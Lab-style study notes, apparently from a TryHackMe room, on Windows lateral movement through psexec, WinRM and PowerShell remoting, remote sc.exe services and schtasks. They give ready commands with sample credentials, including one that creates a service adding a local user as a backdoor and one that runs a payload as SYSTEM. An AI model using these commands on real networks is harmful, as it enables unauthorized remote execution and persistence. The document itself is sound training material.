## Psexec (psexesvc.exe)
- **Ports:** 445/TCP (SMB)
- **Required Group Memberships:** Administrators

Psexec has been the go-to method when needing to execute processes remotely for years. It allows an administrator user to run commands remotely on any PC where he has access. Psexec is one of many Sysinternals Tools and can be downloaded [here](https://docs.microsoft.com/en-us/sysinternals/downloads/psexec).

The way psexec works is as follows:
1. *Connect to Admin$ share and upload a service binary*. Psexec uses `psexesvc.exe` as the name.
2. *Connect to the service control manager* to create and run a service named *PSEXESVC* and associate the service binary with `C:\Windows\psexesvc.exe`.
3. *Create some named pipes* to handle *stdin/stdout/stderr*.

![](Pasted%20image%2020241116001403.png)

To run psexec, we only need to supply the required *administrator credentials* for the remote host and the *command we want to run.*
```shell-session
psexec64.exe \\{MACHINE_IP} -u Administrator -p Mypass123 -i cmd.exe
```


## WinRM (winrs.exe)
- **Ports:** 5985/TCP (WinRM HTTP) or 5986/TCP (WinRM HTTPS)
- **Required Group Memberships:** Remote Management Users

Windows Remote Management (WinRM) is a web-based protocol *used to send Powershell commands to Windows hosts* remotely. Most *Windows Server installations have WinRM enabled by default*, making it an attractive attack vector.

To connect to a remote Powershell session from the command line, we can use the following command:
```shell-session
winrs.exe -u:Administrator -p:Mypass123 -r:target cmd
```

We can achieve the same from Powershell, but to pass different credentials, we will need to create a *PSCredential* object:
```powershell
$username = 'Administrator';
$password = 'Mypass123';
$securePassword = ConvertTo-SecureString $password -AsPlainText -Force; 
$credential = New-Object System.Management.Automation.PSCredential $username, $securePassword;
```

Once we have our *PSCredential* object, we can create an interactive session using the `Enter-PSSession` cmdlet:
```powershell
Enter-PSSession -Computername {TARGET} -Credential $credential
```

Powershell also includes the `Invoke-Command` cmdlet, which runs ScriptBlocks remotely via WinRM. Credentials must be passed through a *PSCredential* object as well:
```powershell
Invoke-Command -Computername {TARGET} -Credential $credential -ScriptBlock {whoami}
```


## sc (sc.exe)
- **Ports:**
    - 135/TCP, 49152-65535/TCP (DCE/RPC)
    - 445/TCP (RPC over SMB Named Pipes)
    - 139/TCP (RPC over SMB Named Pipes)
- **Required Group Memberships:** Administrators

Windows services can also be leveraged to run arbitrary commands since they execute a command when started. While a service executable is technically different from a regular application, if we configure a Windows service to run any application, it will still execute it and fail afterwards.

We can create a service on a remote host with *sc.exe*, a standard tool available in Windows. When using sc, it will try to connect to the *Service Control Manager (SVCCTL)* remote service program through *RPC* in several ways:

1. *A connection attempt will be made using RPC/DCE.* 
	   The client will first connect to the Endpoint Mapper (EPM) at port 135, which serves as a catalogue of available RPC endpoints and request information on the SVCCTL service program. 
		   The EPM will then respond with the IP and port to connect to SVCCTL, which is usually a dynamic port in the range of 49152-65535.
	 ![](Pasted%20image%2020241116004617.png)
2. *If the latter connection fails, sc will try to reach SVCCTL through SMB named pipes, either on port 445 (SMB) or 139 (SMB over NetBIOS)*.
	 ![](Pasted%20image%2020241116004902.png)

We can create and start a service named "THMservice" using the following commands:
```shell-session
sc.exe \\{TARGET} create {THMservice} binPath= "net user munra Pass123 /add" start= auto
sc.exe \\{TARGET} start {THMservice}
```
The "net user" command will be executed when the service is started, creating a new local user on the system. Since the operating system is in charge of starting the service, you won't be able to look at the command output.

To stop and delete the service, we can then execute the following commands:
```shell-session
sc.exe \\{TARGET} stop {THMservice}
sc.exe \\{TARGET} delete {THMservice}
```

## Scheduled Tasks
 You can create and run one remotely with schtasks, available in any Windows installation. To create a task named THMtask1, we can use the following commands:
 ```shell-session
schtasks /s {TARGET} /RU "SYSTEM" /create /tn {"THMtask1"} /tr "<command/payload to execute>" /sc ONCE /sd 01/01/1970 /st 00:00 

schtasks /s {TARGET} /run /TN {"THMtask1"} 
```

We set the schedule type (`/sc`) to ONCE, which means the task is intended to be run only once at the specified time and date. Since we will be running the task manually, the starting date (`/sd`) and starting time (`/st`) won't matter much anyway.

Since the system will run the scheduled task, the command's output won't be available to us, making this *a blind attack.*

Finally, to delete the scheduled task, we can use the following command:
```shell-session
schtasks /S {TARGET} /TN {"THMtask1"} /DELETE /F
```


## Example
